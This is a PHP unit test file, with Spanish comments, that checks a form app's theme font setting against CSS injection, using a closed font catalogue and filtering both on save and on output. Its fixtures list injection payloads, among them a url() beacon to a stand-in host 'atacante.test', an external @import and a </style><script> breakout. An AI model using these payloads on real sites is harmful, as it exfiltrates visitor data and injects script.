<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Services\FormSettings;

/**
 * Fase 2, item 2.8 — la tipografía del tema: inyección de CSS y catálogo.
 *
 * El valor de `settings.theme.font` va directo a un `font-family` dentro de un
 * `<style>` que carga el **fill público**, o sea sin sesión ni CSRF. La
 * validación que había era la de los colores, y el font no se comprobaba: con
 * eso, guardar `Arial; } body{background:url(//atacante/leer?x)` añadía
 * declaraciones CSS nuevas en la página de todos los visitantes.
 *
 * El arreglo pasó de una lista blanca por patrón a un **catálogo cerrado**
 * (`FormSettings::fonts()`): la tipografía ahora es una familia auto-hospedada
 * en `public/assets/fonts/`, así que el nombre que se emite y el archivo que se
 * sirve salen del mapa y no del texto de la fila. Con eso la inyección ya no
 * tiene punto de entrada, pero la regla de las dos puertas sigue en pie: puede
 * haber filas de `forms.settings` guardadas antes del catálogo, y filtrar solo
 * al guardar no las limpia.
 *
 * Lo que se mide aquí:
 *
 *  - `fonts()` es el único catálogo y sus dos direcciones cuadran: toda familia
 *    tiene su `.woff2`, y todo `.woff2` de la carpeta está en el catálogo.
 *  - `normalize()` descarta lo que no esté en el catálogo (puerta de entrada).
 *  - `themeCss()` lo descarta también al emitir (puerta de salida, para las
 *    filas viejas).
 *  - `validate()` mira el valor CRUDO: si mirara el normalizado nunca vería un
 *    valor inválido (ya viene en null) y quien elige la tipografía se quedaría
 *    sin aviso de que se le descartó en silencio.
 */
class ThemeFontCssInjectionTest
{
    /**
     * Valores que NO están en el catálogo: los ataques de la fase 2 y, de paso,
     * los nombres de familia del sistema que se aceptaban antes (ya no).
     *
     * @return array<string, string>
     */
    private function valoresFueraDelCatalogo(): array
    {
        return [
            'cierre de regla y beacon' => 'Arial; } body{background:url(//atacante.test/leer?a=1)',
            'url() directo'              => 'url(//atacante.test/leer?b=1)',
            'importacion externa'        => '@import url("//atacante.test/x.css")',
            'comilla doble'              => 'Arial"; } #x{color:red',
            'comilla simple'             => "Arial'; } #x{color:red",
            'cierre de script'           => 'arial}</style><script>alert(1)</script>',
            'llave suelta'               => 'Arial}',
            'punto y coma'               => 'Arial;',
            'parentesis'                 => 'Arial(1)',
            'barra invertida'            => 'Arial\\',
            'dos puntos'                 => 'Arial:red',
            'asterisco importante'       => 'Arial !important',
            'familia del sistema'        => 'Georgia, serif',
            'familia con alternativa'    => 'Inter, sans-serif',
            'familia a secas'            => 'Georgia',
        ];
    }

    /** El catálogo no puede estar vacío o los tests de abajo pasarían en vano. */
    public function testElCatalogoEsUnMapaNoVacio(): void
    {
        $fonts = FormSettings::fonts();
        assertTrue($fonts !== [], 'el catálogo de tipografías no puede estar vacío');
        foreach ($fonts as $familia => $archivo) {
            assertTrue(is_string($familia) && $familia !== '', 'cada familia del catálogo tiene nombre');
            assertTrue(
                is_string($archivo) && str_ends_with($archivo, '.woff2'),
                'cada entrada del catálogo es un archivo .woff2: ' . $familia
            );
        }
    }

    /**
     * Dirección 1 — toda familia del catálogo tiene su archivo. Sin esto se
     * podría elegir una fuente que el formulario pide y el servidor no tiene:
     * un 404 silencioso y la fuente cae a la del sistema.
     */
    public function testTodaFamiliaDelCatalogoTieneSuArchivo(): void
    {
        $carpeta = dirname(__DIR__, 2) . '/public/assets/fonts/';
        assertTrue(is_dir($carpeta), 'la carpeta de fuentes existe: ' . $carpeta);

        $faltan = [];
        foreach (FormSettings::fonts() as $familia => $archivo) {
            if (!is_file($carpeta . $archivo)) {
                $faltan[] = $familia . ' => ' . $archivo;
            }
        }
        assertTrue($faltan === [], 'estas familias se pueden elegir y no tienen archivo: ' . implode(', ', $faltan));
    }

    /**
     * Dirección 2 — todo `.woff2` de la carpeta está en el catálogo. Un archivo
     * que nadie puede elegir es código muerto que se arrastra en el repo; y si
     * el archivo está pero la fila no, la familia no se emite (lo dice
     * `FUENTES.md`). Se salta los `fa-*.woff2`: son de FontAwesome y viven aquí
     * solo porque `all.min.css` los pide, no en `FormSettings`.
     */
    public function testTodoWoff2DeLaCarpetaEstaEnElCatalogo(): void
    {
        $carpeta = dirname(__DIR__, 2) . '/public/assets/fonts/';
        $archivos = glob($carpeta . '*.woff2') ?: [];
        assertTrue(count($archivos) >= 4, 'la carpeta tiene las cuatro fuentes: ' . count($archivos));

        $enCatalogo = array_values(FormSettings::fonts());
        $huerfanos = [];
        foreach ($archivos as $ruta) {
            $nombre = basename($ruta);
            // FontAwesome: no son parte del catálogo (FUENTES.md, «Lo que NO va aquí»).
            if (str_starts_with($nombre, 'fa-')) {
                continue;
            }
            if (!in_array($nombre, $enCatalogo, true)) {
                $huerfanos[] = $nombre;
            }
        }
        assertTrue($huerfanos === [], 'hay .woff2 que no están en FormSettings::fonts(): ' . implode(', ', $huerfanos));
    }

    /**
     * Primera puerta: lo que llega del builder o de un POST de settings se
     * descarta al normalizar, así que ni llega a guardarse.
     */
    public function testNormalizeDescartaLaTipografiaFueraDelCatalogo(): void
    {
        foreach ($this->valoresFueraDelCatalogo() as $caso => $valor) {
            $n = FormSettings::normalize(['theme' => ['font' => $valor]]);
            assertNull(
                $n['theme']['font'],
                'normalize debe dejar la tipografía en null (' . $caso . '): ' . $valor
            );
        }
    }

    /**
     * Segunda puerta, y la que de verdad protege: una fila ya guardada con un
     * font que no está en el catálogo (de antes del arreglo) NO debe producir
     * CSS. Aquí el settings NO pasa por normalize, va tal cual, como lo leería
     * el fill.
     */
    public function testThemeCssIgnoraLaTipografiaFueraDelCatalogoDeUnaFilaVieja(): void
    {
        foreach ($this->valoresFueraDelCatalogo() as $caso => $valor) {
            $css = FormSettings::themeCss(['theme' => ['font' => $valor]]);
            assertEquals('', $css, 'una fila con font fuera del catálogo no debe emitir CSS (' . $caso . ')');
        }
    }

    /**
     * El filtro no puede comerse el resto del tema: si el font no está en el
     * catálogo, los colores válidos se siguen emitiendo (o sea, se descarta la
     * variable, no el tema entero, que sería un fallo distinto y más silencioso).
     */
    public function testUnFontInvalidoNoArrastraLosColoresValidos(): void
    {
        $css = FormSettings::themeCss([
            'theme' => [
                'primary'    => '#3366ff',
                'background' => '#ffffff',
                'font'       => 'Arial; } body{background:url(//atacante.test/x)',
            ],
        ]);

        self::assertStringContains('--vf-primary:#3366ff', $css);
        self::assertStringContains('--vf-background:#ffffff', $css);
        assertFalse(str_contains($css, '--vf-font'), 'la variable de la fuente no se emite');
        assertFalse(str_contains($css, '@font-face'), 'tampoco se emite el @font-face');
        assertFalse(str_contains($css, 'atacante'), 'no puede colarse nada del payload');
        // Una llave de cada: la que abre :root y la que lo cierra. El payload
        // traía dos de cierre, y con la segunda el CSS se salía del :root.
        assertSame(1, substr_count($css, '{'), 'solo la llave que abre :root');
        assertSame(1, substr_count($css, '}'), 'solo la llave que cierra :root');
    }

    /**
     * El espacio alrededor sí se tolera, porque `normalize()` recorta antes de
     * buscar en el catálogo y quien lo escribe en el formulario se encuentra con
     * los espacios pegados de cualquier forma. Se fija el comportamiento para
     * que nadie lo lea como un agujero: el recorte va ANTES de la lista.
     */
    public function testElEspacioAlrededorSeRecortaYNoEsUnError(): void
    {
        $n = FormSettings::normalize(['theme' => ['font' => '  Lora  ']]);
        assertSame('Lora', $n['theme']['font'], 'los espacios de los extremos se recortan');
        assertNull(FormSettings::validate(['theme' => ['font' => '  Lora  ']]), 'y no es un error de validación');
    }

    /**
     * La familia elegida produce su `@font-face` (auto-hospedada, del mismo
     * origen) y la variable que lee `app.css`. Sin comillas: una familia con
     * espacios es CSS válido y el htmlspecialchars previo las volvía `&quot;`,
     * que dentro de un `<style>` no se decodifica (nombre de fuente roto).
     */
    public function testThemeCssEmiteLaTipografiaDelCatalogoSinComillas(): void
    {
        $css = FormSettings::themeCss(FormSettings::normalize([
            'theme' => ['font' => 'Source Sans 3'],
        ]));

        self::assertStringContains('--vf-font:Source Sans 3', $css);
        self::assertStringContains('@font-face', $css);
        self::assertStringContains('font-family:Source Sans 3', $css);
        self::assertStringContains('src:url(/assets/fonts/source-sans-3-latin-var.woff2)', $css);
        assertFalse(str_contains($css, '&quot;'), 'no debe quedar ninguna entidad en el CSS');
        assertFalse(str_contains($css, "'"), 'sin comillas alrededor del nombre de familia');
    }

    /**
     * `validate()` tiene que avisar, no fallar en silencio: si solo mirara el
     * valor normalizado (que ya viene en null) nunca devolvería este error y
     * quien elige la tipografía no sabría por qué no se guardó.
     */
    public function testValidateAvisaDeLaTipografiaFueraDelCatalogo(): void
    {
        foreach ($this->valoresFueraDelCatalogo() as $caso => $valor) {
            $msg = FormSettings::validate(['theme' => ['font' => $valor]]);
            assertNotNull($msg, 'validate debe avisar del valor fuera del catálogo (' . $caso . '): ' . $valor);
        }

        assertNull(FormSettings::validate(['theme' => ['font' => 'Lora']]), 'una tipografía del catálogo no da error');
        assertNull(FormSettings::validate(['theme' => ['font' => '']]), 'vacía no es un error');
    }

    /**
 * La otra mitad del tema: lo que `themeCss()` EMITE tiene que LEERSE.
 *
 * Este archivo nació por la puerta de entrada, y mientras miraba esa puerta
 * apareció el otro fallo, del mismo género y bastante más tonto: «Color de
 * fondo» y «Fuente» se guardaban, se validaban y se emitían como
 * `--vf-background` y `--vf-font`, y en `app.css` esas dos variables NO
 * aparecían ni una vez. De los tres ajustes de «Diseño» solo funcionaba el
 * color principal. El color de página era un gradiente escrito a mano dos
 * veces en el archivo (la segunda ganaba por orden y la primera era código
 * muerto) y la fuente la ponía `body` a pelo.
 *
 * Un ajuste que se guarda bien y no se ve no da ningún error, que es
 * exactamente por lo que hace falta el test: que toda variable que el tema
 * emite tenga un consumidor, para que la próxima no pase en silencio.
 */
    public function testTodaVariableDelTemaTieneUnConsumidorEnElCss(): void
    {
        $css = (string) file_get_contents(dirname(__DIR__, 2) . '/public/assets/css/app.css');

        $emitido = FormSettings::themeCss(FormSettings::normalize([
            'theme' => ['primary' => '#123456', 'background' => '#fedcba', 'font' => 'Lora'],
        ]));
        preg_match_all('/(--vf-[a-z-]+)\s*:/', $emitido, $m);
        $variables = array_values(array_unique($m[1]));

        assertTrue($variables !== [], 'el tema debe emitir variables: ' . $emitido);

        $huerfanas = [];
        foreach ($variables as $v) {
            if (!str_contains($css, 'var(' . $v)) {
                $huerfanas[] = $v;
            }
        }
        assertTrue(
            $huerfanas === [],
            'estas variables las emite themeCss() y no las lee nadie en app.css, así que el ajuste se '
                . 'guarda y no se aplica: ' . implode(', ', $huerfanas)
        );
    }

/**
 * Y que la del fondo se aplique al fondo de la PÁGINA, no a la tarjeta: con un
 * color oscuro de fondo, la tarjeta en blanco es lo que mantiene legible el
 * formulario.
 */
    public function testElColorDeFondoSeAplicaAlFondoDeLaPaginaYLaTarjetaSigueBlanca(): void
    {
        $css = (string) file_get_contents(dirname(__DIR__, 2) . '/public/assets/css/app.css');
        assertTrue(
            preg_match('/\.fill-body\s*\{[^}]*background:\s*var\(--vf-background\)/s', $css) === 1,
            '.fill-body tiene que tomar --vf-background: es el «fondo de la página del formulario» que promete el control'
        );
        assertTrue(
            preg_match('/\.app-fill-card \.card-body\s*\{[^}]*background:\s*#fff/s', $css) === 1,
            'la tarjeta del formulario se queda en blanco'
        );
    }

    private function assertStringContains(string $needle, string $haystack): void
    {
        assertTrue(
            str_contains($haystack, $needle),
            'se esperaba que ' . var_export($needle, true) . ' estuviera en ' . var_export($haystack, true)
        );
    }
}
